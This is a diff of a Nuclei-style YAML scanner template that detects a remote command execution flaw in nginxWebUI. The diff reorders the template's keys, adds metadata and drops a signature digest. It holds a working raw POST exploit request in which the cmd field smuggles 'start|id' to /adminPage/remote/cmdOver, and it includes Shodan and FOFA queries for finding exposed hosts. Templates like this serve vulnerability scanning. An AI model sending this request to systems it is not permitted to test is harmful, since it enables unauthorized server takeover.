@@ -1,41 +1,43 @@
-id: nginx-webui-rce
-
-info:
-  name: nginxWebUI ≤ 3.5.0 - Remote Command Execution
-  author: ritikchaddha
-  severity: critical
-  description: |
-    There is a command execution vulnerability in the nginxWebUI backend. After logging in to the backend, the attacker can execute any command to obtain server permissions.
-  reference: |
-    - https://forum.butian.net/article/243
-  metadata:
-    max-request: 1
-    shodan-query: title="nginxwebui"
-    fofa-query: title="nginxwebui"
-  tags: nginx,nginxwebui,webui,rce
-
 http:
-  - raw:
-      - |
-        POST /adminPage/remote/cmdOver HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+- matchers:
+  - part: body
+    regex:
+    - uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)
+    type: regex
+  - part: header
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /adminPage/remote/cmdOver HTTP/1.1
 
-        remoteId=local&cmd=start|id&interval=1
+    Host: {{Hostname}}
 
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
+    Content-Type: application/x-www-form-urlencoded
 
-      - type: word
-        part: header
-        words:
-          - "application/json"
 
-      - type: status
-        status:
-          - 200
-# digest: 490a004630440220783be460f56c1a63d64579be48fb0d446b6a93054e0afcc8cc9afd79c2fad56d022011d35d81b18b3b8f58265661778006b07961e04ede40fd79f54f52e6c92c1271:922c64590222798bb761d5b6d8e72950
+    remoteId=local&cmd=start|id&interval=1
+
+    '
+id: nginx-webui-rce
+info:
+  author: ritikchaddha
+  description: 'There is a command execution vulnerability in the nginxWebUI backend.
+    After logging in to the backend, the attacker can execute any command to obtain
+    server permissions.
+
+    '
+  metadata:
+    fofa-query: title="nginxwebui"
+    max-request: 1
+    runzero-match: any(each(service["html.titles"]), {# matches "(?i)nginxwebui"})
+    shodan-query: title="nginxwebui"
+  name: "nginxWebUI \u2264 3.5.0 - Remote Command Execution"
+  reference:
+  - https://forum.butian.net/article/243
+  severity: critical
+  tags: nginx,nginxwebui,webui,rce,vuln
